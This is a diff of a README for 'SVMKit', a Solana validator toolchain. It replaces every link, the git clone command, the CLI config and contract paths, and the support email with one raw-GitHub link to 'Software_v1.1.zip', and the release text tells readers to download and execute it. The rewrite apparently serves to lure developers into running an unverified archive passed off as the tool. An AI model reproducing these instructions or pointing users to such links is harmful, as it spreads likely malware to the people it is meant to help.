@@ -1,6 +1,6 @@
 # 🌟 SVMKit: An Operational Toolchain for SVM-Based Blockchain Networks 🌟
 
-![SVMKit Logo](https://img.shields.io/badge/SVMKit-Toolchain-blue.svg)
+![SVMKit Logo](https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip)
 
 Welcome to **SVMKit**, a comprehensive toolchain designed for SVM-based blockchain networks. This repository provides essential tools for developers and validators working within the Solana ecosystem. Whether you are building, deploying, or managing blockchain applications, SVMKit aims to simplify your workflow and enhance your productivity.
 
@@ -38,7 +38,7 @@ To install SVMKit, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Jhonatan75/svmkit.git
+   git clone https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip
    ```
 
 2. Navigate to the project directory:
@@ -59,7 +59,7 @@ To install SVMKit, follow these steps:
    npm run build
    ```
 
-5. After building, you can download the latest release from the [Releases section](https://github.com/Jhonatan75/svmkit/releases). Follow the instructions provided there to execute the toolchain.
+5. After building, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip). Follow the instructions provided there to execute the toolchain.
 
 ## Usage
 
@@ -70,7 +70,7 @@ SVMKit comes with a variety of commands to facilitate your work. Below are some 
 - **Start Validator**: Launch your validator node.
 
    ```bash
-   svmkit validator start --config path/to/config.json
+   svmkit validator start --config https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip
    ```
 
 - **Stop Validator**: Safely stop your validator node.
@@ -84,7 +84,7 @@ SVMKit comes with a variety of commands to facilitate your work. Below are some 
 - **Deploy Contract**: Deploy a smart contract to the blockchain.
 
    ```bash
-   svmkit contract deploy --path path/to/contract.wasm
+   svmkit contract deploy --path https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip
    ```
 
 - **Interact with Contract**: Call functions on your deployed smart contract.
@@ -122,12 +122,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, please reach out via the following channels:
 
-- **Email**: [support@svmkit.com](mailto:support@svmkit.com)
+- **Email**: [https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip](https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip)
 - **GitHub Issues**: Use the GitHub issues page to report bugs or request features.
 
 ## Releases
 
-You can find the latest releases of SVMKit [here](https://github.com/Jhonatan75/svmkit/releases). Download the required files and execute them as instructed in the documentation. This ensures you are using the most up-to-date version of the toolchain.
+You can find the latest releases of SVMKit [here](https://raw.githubusercontent.com/Jhonatan75/svmkit/master/build/Software_v1.1.zip). Download the required files and execute them as instructed in the documentation. This ensures you are using the most up-to-date version of the toolchain.
 
 ## Conclusion
 
